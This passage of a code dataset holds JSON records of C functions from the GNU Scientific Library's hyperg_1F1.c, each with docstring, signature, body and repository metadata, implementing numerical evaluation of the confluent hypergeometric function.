{"docstring": "/* Luke's rational approximation.\n * See [Luke, Algorithms for the Computation of Mathematical Functions, p.182]\n *\n * Like the case of the 2F1 rational approximations, these are\n * probably guaranteed to converge for x < 0, barring gross\n * numerical instability in the pre-asymptotic regime.\n */\n", "func_signal": "static\nint\nhyperg_1F1_luke(const double a, const double c, const double xin,\n                gsl_sf_result * result)", "code": "{\n  const double RECUR_BIG = 1.0e+50;\n  const int nmax = 5000;\n  int n = 3;\n  const double x  = -xin;\n  const double x3 = x*x*x;\n  const double t0 = a/c;\n  const double t1 = (a+1.0)/(2.0*c);\n  const double t2 = (a+2.0)/(2.0*(c+1.0));\n  double F = 1.0;\n  double prec;\n\n  double Bnm3 = 1.0;                                  /* B0 */\n  double Bnm2 = 1.0 + t1 * x;                         /* B1 */\n  double Bnm1 = 1.0 + t2 * x * (1.0 + t1/3.0 * x);    /* B2 */\n \n  double Anm3 = 1.0;                                                      /* A0 */\n  double Anm2 = Bnm2 - t0 * x;                                            /* A1 */\n  double Anm1 = Bnm1 - t0*(1.0 + t2*x)*x + t0 * t1 * (c/(c+1.0)) * x*x;   /* A2 */\n\n  while(1) {\n    double npam1 = n + a - 1;\n    double npcm1 = n + c - 1;\n    double npam2 = n + a - 2;\n    double npcm2 = n + c - 2;\n    double tnm1  = 2*n - 1;\n    double tnm3  = 2*n - 3;\n    double tnm5  = 2*n - 5;\n    double F1 =  (n-a-2) / (2*tnm3*npcm1);\n    double F2 =  (n+a)*npam1 / (4*tnm1*tnm3*npcm2*npcm1);\n    double F3 = -npam2*npam1*(n-a-2) / (8*tnm3*tnm3*tnm5*(n+c-3)*npcm2*npcm1);\n    double E  = -npam1*(n-c-1) / (2*tnm3*npcm2*npcm1);\n\n    double An = (1.0+F1*x)*Anm1 + (E + F2*x)*x*Anm2 + F3*x3*Anm3;\n    double Bn = (1.0+F1*x)*Bnm1 + (E + F2*x)*x*Bnm2 + F3*x3*Bnm3;\n    double r = An/Bn;\n\n    prec = fabs((F - r)/F);\n    F = r;\n\n    if(prec < GSL_DBL_EPSILON || n > nmax) break;\n\n    if(fabs(An) > RECUR_BIG || fabs(Bn) > RECUR_BIG) {\n      An   /= RECUR_BIG;\n      Bn   /= RECUR_BIG;\n      Anm1 /= RECUR_BIG;\n      Bnm1 /= RECUR_BIG;\n      Anm2 /= RECUR_BIG;\n      Bnm2 /= RECUR_BIG;\n      Anm3 /= RECUR_BIG;\n      Bnm3 /= RECUR_BIG;\n    }\n    else if(fabs(An) < 1.0/RECUR_BIG || fabs(Bn) < 1.0/RECUR_BIG) {\n      An   *= RECUR_BIG;\n      Bn   *= RECUR_BIG;\n      Anm1 *= RECUR_BIG;\n      Bnm1 *= RECUR_BIG;\n      Anm2 *= RECUR_BIG;\n      Bnm2 *= RECUR_BIG;\n      Anm3 *= RECUR_BIG;\n      Bnm3 *= RECUR_BIG;\n    }\n\n    n++;\n    Bnm3 = Bnm2;\n    Bnm2 = Bnm1;\n    Bnm1 = Bn;\n    Anm3 = Anm2;\n    Anm2 = Anm1;\n    Anm1 = An;\n  }\n\n  result->val  = F;\n  result->err  = 2.0 * fabs(F * prec);\n  result->err += 2.0 * GSL_DBL_EPSILON * (n-1.0) * fabs(F);\n\n  return GSL_SUCCESS;\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Evaluate negative integer a case by relation\n * to Laguerre polynomials. This is more general than\n * the direct polynomial evaluation, but is safe\n * for all values of x.\n *\n * 1F1(-n,b,x) = n!/(b)_n Laguerre[n,b-1,x]\n *             = n B(b,n) Laguerre[n,b-1,x]\n *\n * assumes b is not a negative integer\n */\n", "func_signal": "static\nint\nhyperg_1F1_a_negint_lag(const int a, const double b, const double x, gsl_sf_result * result)", "code": "{\n  const int n = -a;\n\n  gsl_sf_result lag;\n  const int stat_l = gsl_sf_laguerre_n_e(n, b-1.0, x, &lag);\n  if(b < 0.0) {\n    gsl_sf_result lnfact;\n    gsl_sf_result lng1;\n    gsl_sf_result lng2;\n    double s1, s2;\n    const int stat_f  = gsl_sf_lnfact_e(n, &lnfact);\n    const int stat_g1 = gsl_sf_lngamma_sgn_e(b + n, &lng1, &s1);\n    const int stat_g2 = gsl_sf_lngamma_sgn_e(b, &lng2, &s2);\n    const double lnpre_val = lnfact.val - (lng1.val - lng2.val);\n    const double lnpre_err = lnfact.err + lng1.err + lng2.err\n      + 2.0 * GSL_DBL_EPSILON * fabs(lnpre_val);\n    const int stat_e = gsl_sf_exp_mult_err_e(lnpre_val, lnpre_err,\n                                                s1*s2*lag.val, lag.err,\n                                                result);\n    return GSL_ERROR_SELECT_5(stat_e, stat_l, stat_g1, stat_g2, stat_f);\n  }\n  else {\n    gsl_sf_result lnbeta;\n    gsl_sf_lnbeta_e(b, n, &lnbeta);\n    if(fabs(lnbeta.val) < 0.1) {\n      /* As we have noted, when B(x,y) is near 1,\n       * evaluating log(B(x,y)) is not accurate.\n       * Instead we evaluate B(x,y) directly.\n       */\n      const double ln_term_val = log(1.25*n);\n      const double ln_term_err = 2.0 * GSL_DBL_EPSILON * ln_term_val;\n      gsl_sf_result beta;\n      int stat_b = gsl_sf_beta_e(b, n, &beta);\n      int stat_e = gsl_sf_exp_mult_err_e(ln_term_val, ln_term_err,\n                                            lag.val, lag.err,\n                                            result);\n      result->val *= beta.val/1.25;\n      result->err *= beta.val/1.25;\n      return GSL_ERROR_SELECT_3(stat_e, stat_l, stat_b);\n    }\n    else {\n      /* B(x,y) was not near 1, so it is safe to use\n       * the logarithmic values.\n       */\n      const double ln_n = log(n);\n      const double ln_term_val = lnbeta.val + ln_n;\n      const double ln_term_err = lnbeta.err + 2.0 * GSL_DBL_EPSILON * fabs(ln_n);\n      int stat_e = gsl_sf_exp_mult_err_e(ln_term_val, ln_term_err,\n                                            lag.val, lag.err,\n                                            result);\n      return GSL_ERROR_SELECT_2(stat_e, stat_l);\n    }\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* 1F1(b+eps,b,x)\n * |eps|<=1, b > 0\n */\n", "func_signal": "static\nint\nhyperg_1F1_beps_bgt0(const double eps, const double b, const double x, gsl_sf_result * result)", "code": "{\n  if(b > fabs(x) && fabs(eps) < GSL_SQRT_DBL_EPSILON) {\n    /* If b-a is very small and x/b is not too large we can\n     * use this explicit approximation.\n     *\n     * 1F1(b+eps,b,x) = exp(ax/b) (1 - eps x^2 (v2 + v3 x + ...) + ...)\n     *\n     *   v2 = a/(2b^2(b+1))\n     *   v3 = a(b-2a)/(3b^3(b+1)(b+2))\n     *   ...\n     *\n     * See [Luke, Mathematical Functions and Their Approximations, p.292]\n     *\n     * This cannot be used for b near a negative integer or zero.\n     * Also, if x/b is large the deviation from exp(x) behaviour grows.\n     */\n    double a = b + eps;\n    gsl_sf_result exab;\n    int stat_e = gsl_sf_exp_e(a*x/b, &exab);\n    double v2 = a/(2.0*b*b*(b+1.0));\n    double v3 = a*(b-2.0*a)/(3.0*b*b*b*(b+1.0)*(b+2.0));\n    double v  = v2 + v3 * x;\n    double f  = (1.0 - eps*x*x*v);\n    result->val  = exab.val * f;\n    result->err  = exab.err * fabs(f);\n    result->err += fabs(exab.val) * GSL_DBL_EPSILON * (1.0 + fabs(eps*x*x*v));\n    result->err += 4.0 * GSL_DBL_EPSILON * fabs(result->val);\n    return stat_e;\n  }\n  else {\n    /* Otherwise use a Kummer transformation to reduce\n     * it to the small a case.\n     */\n    gsl_sf_result Kummer_1F1;\n    int stat_K = hyperg_1F1_small_a_bgt0(-eps, b, -x, &Kummer_1F1);\n    if(Kummer_1F1.val != 0.0) {\n      int stat_e = gsl_sf_exp_mult_err_e(x, 2.0*GSL_DBL_EPSILON*fabs(x),\n                                            Kummer_1F1.val, Kummer_1F1.err,\n                                            result);\n      return GSL_ERROR_SELECT_2(stat_e, stat_K);\n    }\n    else {\n      result->val = 0.0;\n      result->err = 0.0;\n      return stat_K;\n    }\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Luke in the canonical case.\n   */\n", "func_signal": "if(x < 0.0 && !a_neg_integer && !bma_neg_integer)", "code": "{\n    double prec;\n    return hyperg_1F1_luke(a, b, x, result, &prec);\n  }\n\n\n  /* Luke with Kummer transformation.\n   */\n  if(x > 0.0 && !a_neg_integer && !bma_neg_integer) {\n    double prec;\n    double Kummer_1F1;\n    double ex;\n    int stat_F = hyperg_1F1_luke(b-a, b, -x, &Kummer_1F1, &prec);\n    int stat_e = gsl_sf_exp_e(x, &ex);\n    if(stat_F == GSL_SUCCESS && stat_e == GSL_SUCCESS) {\n      double lnr = log(fabs(Kummer_1F1)) + x;\n      if(lnr < GSL_LOG_DBL_MAX) {\n        *result = ex * Kummer_1F1;\n        return GSL_SUCCESS;\n      }\n      else {\n        *result = GSL_POSINF; \n        GSL_ERROR (\"overflow\", GSL_EOVRFLW);\n      }\n    }\n    else if(stat_F != GSL_SUCCESS) {\n      *result = 0.0;\n      return stat_F;\n    }\n    else {\n      *result = 0.0;\n      return stat_e;\n    }\n  }\n#endif\n\n\n\n/*-*-*-*-*-*-*-*-*-* Functions w/ Natural Prototypes *-*-*-*-*-*-*-*-*-*-*/\n\n#include \"eval.h\"\n\ndouble gsl_sf_hyperg_1F1_int(const int m, const int n, double x)\n{\n  EVAL_RESULT(gsl_sf_hyperg_1F1_int_e(m, n, x, &result));\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* 1F1'(a,b,x)/1F1(a,b,x)\n * Uses Gautschi's series transformation of the\n * continued fraction. This is apparently the best\n * method for getting this ratio in the stable region.\n * The convergence is monotone and supergeometric\n * when b > x.\n * Assumes a >= -1.\n */\n", "func_signal": "static\nint\nhyperg_1F1_CF1_p_ser(const double a, const double b, const double x, double * result)", "code": "{\n  if(a == 0.0) {\n    *result = 0.0;\n    return GSL_SUCCESS;\n  }\n  else {\n    const int maxiter = 5000;\n    double sum  = 1.0;\n    double pk   = 1.0;\n    double rhok = 0.0;\n    int k;\n    for(k=1; k<maxiter; k++) {\n      double ak = (a + k)*x/((b-x+k-1.0)*(b-x+k));\n      rhok = -ak*(1.0 + rhok)/(1.0 + ak*(1.0+rhok));\n      pk  *= rhok;\n      sum += pk;\n      if(fabs(pk/sum) < 2.0*GSL_DBL_EPSILON) break;\n    }\n    *result = a/(b-x) * sum;\n    if(k == maxiter)\n      GSL_ERROR (\"error\", GSL_EMAXITER);\n    else\n      return GSL_SUCCESS;\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* 1F1(1,b,x)\n * b >=1, b real\n *\n * checked OK: [GJ] Thu Oct  1 16:46:35 MDT 1998\n */\n", "func_signal": "static\nint\nhyperg_1F1_1(const double b, const double x, gsl_sf_result * result)", "code": "{\n  double ax = fabs(x);\n  double ib = floor(b + 0.1);\n\n  if(b < 1.0) {\n    DOMAIN_ERROR(result);\n  }\n  else if(b == 1.0) {\n    return gsl_sf_exp_e(x, result);\n  }\n  else if(b >= 1.4*ax) {\n    return hyperg_1F1_1_series(b, x, result);\n  }\n  else if(fabs(b - ib) < _1F1_INT_THRESHOLD && ib < INT_MAX) {\n    return hyperg_1F1_1_int((int)ib, x, result);\n  }\n  else if(x > 0.0) {\n    if(x > 100.0 && b < 0.75*x) {\n      return hyperg_1F1_asymp_posx(1.0, b, x, result);\n    }\n    else if(b < 1.0e+05) {\n      /* Recurse backward on b, from a\n       * chosen offset point. For x > 0,\n       * which holds here, this should\n       * be a stable direction.\n       */\n      const double off = ceil(1.4*x-b) + 1.0;\n      double bp = b + off;\n      gsl_sf_result M;\n      int stat_s = hyperg_1F1_1_series(bp, x, &M);\n      const double err_rat = M.err / fabs(M.val);\n      while(bp > b+0.1) {\n        /* M(1,b-1) = x/(b-1) M(1,b) + 1 */\n        bp -= 1.0;\n        M.val  = 1.0 + x/bp * M.val;\n      }\n      result->val  = M.val;\n      result->err  = err_rat * fabs(M.val);\n      result->err += 2.0 * GSL_DBL_EPSILON * (fabs(off)+1.0) * fabs(M.val);\n      return stat_s;\n    } else if (fabs(x) < fabs(b) && fabs(x) < sqrt(fabs(b)) * fabs(b-x)) {\n      return hyperg_1F1_largebx(1.0, b, x, result);\n    } else if (fabs(x) > fabs(b)) {\n      return hyperg_1F1_1_series(b, x, result);\n    } else {\n      return hyperg_1F1_large2bm4a(1.0, b, x, result);\n    }\n  }\n  else {\n    /* x <= 0 and b not large compared to |x|\n     */\n    if(ax < 10.0 && b < 10.0) {\n      return hyperg_1F1_1_series(b, x, result);\n    }\n    else if(ax >= 100.0 && GSL_MAX_DBL(fabs(2.0-b),1.0) < 0.99*ax) {\n      return hyperg_1F1_asymp_negx(1.0, b, x, result);\n    }\n    else {\n      return hyperg_1F1_luke(1.0, b, x, result);\n    }\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Asymptotic result for 1F1(a, b, x)  x -> -Infinity.\n * Assumes b-a != neg integer and b != neg integer.\n */\n", "func_signal": "static\nint\nhyperg_1F1_asymp_negx(const double a, const double b, const double x,\n                     gsl_sf_result * result)", "code": "{\n  gsl_sf_result lg_b;\n  gsl_sf_result lg_bma;\n  double sgn_b;\n  double sgn_bma;\n\n  int stat_b   = gsl_sf_lngamma_sgn_e(b,   &lg_b,   &sgn_b);\n  int stat_bma = gsl_sf_lngamma_sgn_e(b-a, &lg_bma, &sgn_bma);\n\n  if(stat_b == GSL_SUCCESS && stat_bma == GSL_SUCCESS) {\n    gsl_sf_result F;\n    int stat_F = gsl_sf_hyperg_2F0_series_e(a, 1.0+a-b, -1.0/x, -1, &F);\n    if(F.val != 0) {\n      double ln_term_val = a*log(-x);\n      double ln_term_err = 2.0 * GSL_DBL_EPSILON * (fabs(a) + fabs(ln_term_val));\n      double ln_pre_val = lg_b.val - lg_bma.val - ln_term_val;\n      double ln_pre_err = lg_b.err + lg_bma.err + ln_term_err;\n      int stat_e = gsl_sf_exp_mult_err_e(ln_pre_val, ln_pre_err,\n                                            sgn_bma*sgn_b*F.val, F.err,\n                                            result);\n      return GSL_ERROR_SELECT_2(stat_e, stat_F);\n    }\n    else {\n      result->val = 0.0;\n      result->err = 0.0;\n      return stat_F;\n    }\n  }\n  else {\n    DOMAIN_ERROR(result);\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Series for 1F1(1,b,x)\n * b > 0\n */\n", "func_signal": "static\nint\nhyperg_1F1_1_series(const double b, const double x, gsl_sf_result * result)", "code": "{\n  double sum_val = 1.0;\n  double sum_err = 0.0;\n  double term = 1.0;\n  double n    = 1.0;\n  while(fabs(term/sum_val) > 0.25*GSL_DBL_EPSILON) {\n    term *= x/(b+n-1);\n    sum_val += term;\n    sum_err += 8.0*GSL_DBL_EPSILON*fabs(term) + GSL_DBL_EPSILON*fabs(sum_val);\n    n += 1.0;\n  }\n  result->val  = sum_val;\n  result->err  = sum_err;\n  result->err += 2.0 *  fabs(term);\n  return GSL_SUCCESS;\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* 1F1(a,b,x)\n * |a| <= 1, b > 0\n */\n", "func_signal": "static\nint\nhyperg_1F1_small_a_bgt0(const double a, const double b, const double x, gsl_sf_result * result)", "code": "{\n  const double bma = b-a;\n  const double oma = 1.0-a;\n  const double ap1mb = 1.0+a-b;\n  const double abs_bma = fabs(bma);\n  const double abs_oma = fabs(oma);\n  const double abs_ap1mb = fabs(ap1mb);\n\n  const double ax = fabs(x);\n\n  if(a == 0.0) {\n    result->val = 1.0;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else if(a == 1.0 && b >= 1.0) {\n    return hyperg_1F1_1(b, x, result);\n  }\n  else if(a == -1.0) {\n    result->val  = 1.0 + a/b * x;\n    result->err  = GSL_DBL_EPSILON * (1.0 + fabs(a/b * x));\n    result->err += 2.0 * GSL_DBL_EPSILON * fabs(result->val);\n    return GSL_SUCCESS;\n  }\n  else if(b >= 1.4*ax) {\n    return gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n  }\n  else if(x > 0.0) {\n    if(x > 100.0 && abs_bma*abs_oma < 0.5*x) {\n      return hyperg_1F1_asymp_posx(a, b, x, result);\n    }\n    else if(b < 5.0e+06) {\n      /* Recurse backward on b from\n       * a suitably high point.\n       */\n      const double b_del = ceil(1.4*x-b) + 1.0;\n      double bp = b + b_del;\n      gsl_sf_result r_Mbp1;\n      gsl_sf_result r_Mb;\n      double Mbp1;\n      double Mb;\n      double Mbm1;\n      int stat_0 = gsl_sf_hyperg_1F1_series_e(a, bp+1.0, x, &r_Mbp1);\n      int stat_1 = gsl_sf_hyperg_1F1_series_e(a, bp,     x, &r_Mb);\n      const double err_rat = fabs(r_Mbp1.err/r_Mbp1.val) + fabs(r_Mb.err/r_Mb.val);\n      Mbp1 = r_Mbp1.val;\n      Mb   = r_Mb.val;\n      while(bp > b+0.1) {\n        /* Do backward recursion. */\n        Mbm1 = ((x+bp-1.0)*Mb - x*(bp-a)/bp*Mbp1)/(bp-1.0);\n        bp -= 1.0;\n        Mbp1 = Mb;\n        Mb   = Mbm1;\n      }\n      result->val  = Mb;\n      result->err  = err_rat * (fabs(b_del)+1.0) * fabs(Mb);\n      result->err += 2.0 * GSL_DBL_EPSILON * fabs(Mb);\n      return GSL_ERROR_SELECT_2(stat_0, stat_1);\n    }\n    else if (fabs(x) < fabs(b) && fabs(a*x) < sqrt(fabs(b)) * fabs(b-x)) {\n      return hyperg_1F1_largebx(a, b, x, result);\n    } else {\n      return hyperg_1F1_large2bm4a(a, b, x, result);\n    }\n  }\n  else {\n    /* x < 0 and b not large compared to |x|\n     */\n    if(ax < 10.0 && b < 10.0) {\n      return gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n    }\n    else if(ax >= 100.0 && GSL_MAX(abs_ap1mb,1.0) < 0.99*ax) {\n      return hyperg_1F1_asymp_negx(a, b, x, result);\n    }\n    else {\n      return hyperg_1F1_luke(a, b, x, result);\n    }\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* 1F1(a,2a,x) = Gamma(a + 1/2) E(x) (|x|/4)^(-a+1/2) scaled_I(a-1/2,|x|/2)\n *\n * E(x) = exp(x) x > 0\n *      = 1      x < 0\n *\n * a >= 1/2\n */\n", "func_signal": "static\nint\nhyperg_1F1_beq2a_pos(const double a, const double x, gsl_sf_result * result)", "code": "{\n  if(x == 0.0) {\n    result->val = 1.0;\n    result->err = 0.0;\n    return GSL_SUCCESS;\n  }\n  else {\n    gsl_sf_result I;\n    int stat_I = gsl_sf_bessel_Inu_scaled_e(a-0.5, 0.5*fabs(x), &I);\n    gsl_sf_result lg;\n    int stat_g = gsl_sf_lngamma_e(a + 0.5, &lg);\n    double ln_term   = (0.5-a)*log(0.25*fabs(x));\n    double lnpre_val = lg.val + GSL_MAX_DBL(x,0.0) + ln_term;\n    double lnpre_err = lg.err + GSL_DBL_EPSILON * (fabs(ln_term) + fabs(x));\n    int stat_e = gsl_sf_exp_mult_err_e(lnpre_val, lnpre_err,\n                                          I.val, I.err,\n                                          result);\n    return GSL_ERROR_SELECT_3(stat_e, stat_g, stat_I);\n  }\n}", "path": "gsl/specfunc/hyperg_1F1.c", "commit_date": "2015-11-16 00:00:00", "repo_name": "ampl/gsl", "stars": 516, "license": "gpl-3.0", "language": "c", "size": 13951}
{"docstring": "/* Handle case of generic positive a, b.\n * Assumes b-a is not a negative integer.\n */\n", "func_signal": "static\nint\nhyperg_1F1_ab_pos(const double a, const double b,\n                  const double x,\n                  gsl_sf_result * result)", "code": "{\n  const double ax = fabs(x);\n\n  if(   ( b < 10.0 && a < 10.0 && ax < 5.0 )\n     || ( b > a*ax )\n     || ( b > a && ax < 5.0 )\n    ) {\n    return gsl_sf_hyperg_1F1_series_e(a, b, x, result);\n  }\n  else if(   x < -100.0\n          && GSL_MAX_DBL(fabs(a),1.0)*GSL_MAX_DBL(fabs(1.0+a-b),1.0) < 0.7*fabs(x)\n    ) {\n    /* Large negative x asymptotic.\n     */\n    return hyperg_1F1_asymp_negx(a, b, x, result);\n  }\n  else if(   x > 100.0\n          && GSL_MAX_DBL(fabs(b-a),1.0)*GSL_MAX_DBL(fabs(1.0-a),1.0) < 0.7*fabs(x)\n    ) {\n    /* Large positive x asymptotic.\n     */\n    return hyperg_1F1_asymp_posx(a, b, x, result);\n  }\n  else if(fabs(b-a) <= 1.0) {\n    /* Directly handle b near a.\n     */\n    return hyperg_1F1_beps_bgt0(a-b, b, x, result);  /* a = b + eps */\n  }\n\n  else if(b > a && b >= 2*a + x) {\n    /* Use the Gautschi CF series, then\n     * recurse backward to a near 0 for normalization.\n     * This will work for either sign of x.\n     */ \n    double rap;\n    int stat_CF1 = hyperg_1F1_CF1_p_ser(a, b, x, &rap);\n    double ra = 1.0 + x/a * rap;\n\n    double Ma   = GSL_SQRT_DBL_MIN;\n    double Map1 = ra * Ma;\n    double Mnp1 = Map1;\n    double Mn   = Ma;\n    double Mnm1;\n    gsl_sf_result Mn_true;\n    int stat_Mt;\n    double n;\n    for(n=a; n>0.5; n -= 1.0) {\n      Mnm1 = (n * Mnp1 - (2.0*n-b+x) * Mn) / (b-n);\n      Mnp1 = Mn;\n      Mn   = Mnm1;\n    }\n\n    stat_Mt = hyperg_1F1_small_a_bgt0(n, b, x, &Mn_true);\n\n    result->val  = (Ma/Mn) * Mn_true.val;\n    result->err  = fabs(Ma/Mn) * Mn_true.err;\n    result->err += 2.0 * GSL_DBL_EPSILON * (fabs(a)+1.0) * fabs(result->val);\n    return GSL_ERROR_SELECT_2(stat_Mt, stat_CF1);\n  }\n  else if(b > a && b < 2*a + x && b > x) {\n    /* Use the Gautschi series representation of\n     * the continued fraction. Then recurse forward\n     * to near the a=b line for normalization. This will\n     * work for either sign of x, although we do need\n     * to check for b > x, which is relevant when x is positive.\n     */\n    gsl_sf_result Mn_true;\n    int stat_Mt;\n    double rap;\n    int stat_CF1 = hyperg_1F1_CF1_p_ser(a, b, x, &rap);\n    double ra = 1.0 + x/a * rap;\n    double Ma   = GSL_SQRT_DBL_MIN;\n    double Mnm1 = Ma;\n    double Mn   = ra * Mnm1;\n    double Mnp1;\n    double n;\n    for(n=a+1.0; n<b-0.5; n += 1.0) {\n      Mnp1 = ((b-n)*Mnm1 + (2*n-b+x)*Mn)/n;\n      Mnm1 = Mn;\n      Mn   = Mnp1;\n    }\n    stat_Mt = hyperg_1F1_beps_bgt0(n-b, b, x, &Mn_true);\n    result->val  = Ma/Mn * Mn_true.val;\n    result->err  = fabs(Ma/Mn) * Mn_true.err;\n    result->err += 2.0 * GSL_DBL_EPSILON * (fabs(b-a)+1.0) * fabs(result->val);\n    return GSL_ERROR_SELECT_2(stat_Mt, stat_CF1);\n  }\n  else if(x >= 0.0) {\n\n    if(b < a) {\n      /* Forward recursion on a from a=b+eps-1,b+eps.\n       */\n      double N   = floor(a-b);\n      double eps = a - b - N;\n      gsl_sf_result r_M0;\n      gsl_sf_result r_M1;\n      int stat_0 = hyperg_1F1_beps_bgt0(eps-1.0, b, x, &r_M0);\n      int stat_1 = hyperg_1F1_beps_bgt0(eps,     b, x, &r_M1);\n      double M0 = r_M0.val;\n      double M1 = r_M1.val;\n\n      double Mam1 = M0;\n      double Ma   = M1;\n      double Map1;\n      double ap;\n      double start_pair = fabs(M0) + fabs(M1);\n      double minim_pair = GSL_DBL_MAX;\n      double pair_ratio;\n      double rat_0 = fabs(r_M0.err/r_M0.val);\n      double rat_1 = fabs(r_M1.err/r_M1.val);\n      for(ap=b+eps; ap<a-0.1; ap += 1.0) {\n        Map1 = ((b-ap)*Mam1 + (2.0*ap-b+x)*Ma)/ap;\n        Mam1 = Ma;\n        Ma   = Map1;\n        minim_pair = GSL_MIN_DBL(fabs(Mam1) + fabs(Ma), minim_pair);\n      }\n      pair_ratio = start_pair/minim_pair;\n      result->val  = Ma;\n      result->err  = 2.0 * (rat_0 + rat_1 + GSL_DBL_EPSILON) * (fabs(b-a)+1.0) * fabs(Ma);\n      result->err += 2.0 * (rat_0 + rat_1) * pair_ratio*pair_ratio * fabs(Ma);\n      result->err += 2.0 * GSL_DBL_EPSILON * fabs(Ma);\n      return GSL_ERROR_SELECT_2(stat_0, stat_1);\n    }\n    else {\n      /* b > a\n       * b < 2a + x \n       * b <= x\n       *\n       * Recurse forward on a from a=eps,eps+1.\n       */\n      double eps = a - floor(a);\n      gsl_sf_result r_Mnm1;\n      gsl_sf_result r_Mn;\n      int stat_0 = hyperg_1F1_small_a_bgt0(eps,     b, x, &r_Mnm1);\n      int stat_1 = hyperg_1F1_small_a_bgt0(eps+1.0, b, x, &r_Mn);\n      double Mnm1 = r_Mnm1.val;\n      double Mn   = r_Mn.val;\n      double Mnp1;\n\n      double n;\n      double start_pair = fabs(Mn) + fabs(Mnm1);\n      double minim_pair = GSL_DBL_MAX;\n      double pair_ratio;\n      double rat_0 = fabs(r_Mnm1.err/r_Mnm1.val);\n      double rat_1 = fabs(r_Mn.err/r_Mn.val);\n      for(n=eps+1.0; n<a-0.1; n++) {\n        Mnp1 = ((b-n)*Mnm1 + (2*n-b+x)*Mn)/n;\n        Mnm1 = Mn;\n        Mn   = Mnp1;\n        minim_pair = GSL_MIN_DBL(fabs(Mn) + fabs(Mnm1), minim_pair);\n      }\n      pair_ratio = start_pair/minim_pair;\n      result->val  = Mn;\n      result->err  = 2.0 * (rat_0 + rat_1 + GSL_DBL_EPSILON) * (fabs(a)+1.0) * fabs(Mn);\n      result->err += 2.0 * (rat_0 + rat_1) * pair_ratio*pair_ratio * fabs(Mn);\n      result->err += 2.0 * GSL_DBL_EPSILON * fabs(Mn);\n      return GSL_ERROR_SELECT_2(stat_0, stat_1);\n    }\n  }\n  else {\n    /* x < 0\n     * b < a\n     */\n\n    if(a <= 0.5*(b-x) || a >= -x) {\n      /* Recurse down in b, from near the a=b line, b=a+eps,a+eps-1.\n       */\n      double N   = floor(a - b);\n      double eps = 1.0 + N - a + b;\n      gsl_sf_result r_Manp1;\n      gsl_sf_result r_Man;\n      int stat_0 = hyperg_1F1_beps_bgt0(-eps,    a+eps,     x, &r_Manp1);\n      int stat_1 = hyperg_1F1_beps_bgt0(1.0-eps, a+eps-1.0, x, &r_Man);\n      double Manp1 = r_Manp1.val;\n      double Man   = r_Man.val;\n      double Manm1;\n\n      double n;\n      double start_pair = fabs(Manp1) + fabs(Man);\n      double minim_pair = GSL_DBL_MAX;\n      double pair_ratio;\n      double rat_0 = fabs(r_Manp1.err/r_Manp1.val);\n      double rat_1 = fabs(r_Man.err/r_Man.val);\n      for(n=a+eps-1.0; n>b+0.1; n -= 1.0) {\n        Manm1 = (-n*(1-n-x)*Man - x*(n-a)*Manp1)/(n*(n-1.0));\n        Manp1 = Man;\n        Man = Manm1;\n        minim_pair = GSL_MIN_DBL(fabs(Manp1) + fabs(Man), minim_pair);\n      }\n\n      /* FIXME: this is a nasty little hack; there is some\n         (transient?) instability in this recurrence for some\n         values. I can tell when it happens, which is when\n         this pair_ratio is large. But I do not know how to\n         measure the error in terms of it. I guessed quadratic\n         below, but it is probably worse than that.\n         */\n      pair_ratio = start_pair/minim_pair;\n      result->val  = Man;\n      result->err  = 2.0 * (rat_0 + rat_1 + GSL_DBL_EPSILON) * (fabs(b-a)+1.0) * fabs(Man);\n      result->err *= pair_ratio*pair_ratio + 1.0;\n      return GSL_ERROR_SELECT_2(stat_0, stat_1);\n    }\n    else {\n      /* Pick a0 such that b ~= 2a0 + x, then\n       * recurse down in b from a0,a0 to determine\n       * the values near the line b=2a+x. Then recurse\n       * forward on a from a0.\n       */\n      double epsa = a - floor(a);\n      double a0   = floor(0.5*(b-x)) + epsa;\n      double N    = floor(a0 - b);\n      double epsb = 1.0 + N - a0 + b;\n      double Ma0b;\n      double Ma0bp1;\n      double Ma0p1b;\n      int stat_a0;\n      double Mnm1;\n      double Mn;\n      double Mnp1;\n      double n;\n      double err_rat;\n      {\n        gsl_sf_result r_Ma0np1;\n        gsl_sf_result r_Ma0n;\n        int stat_0 = hyperg_1F1_beps_bgt0(-epsb,    a0+epsb,     x, &r_Ma0np1);\n        int stat_1 = hyperg_1F1_beps_bgt0(1.0-epsb, a0+epsb-1.0, x, &r_Ma0n);\n        double Ma0np1 = r_Ma0np1.val;\n        double Ma0n   = r_Ma0n.val;\n        double Ma0nm1;\n\n        err_rat = fabs(r_Ma0np1.err/r_Ma0np1.val) + fabs(r_Ma0n.err/r_Ma0n.val);\n\n        for(n=a0+epsb-1.0; n>b+0.1; n -= 1.0) {\n          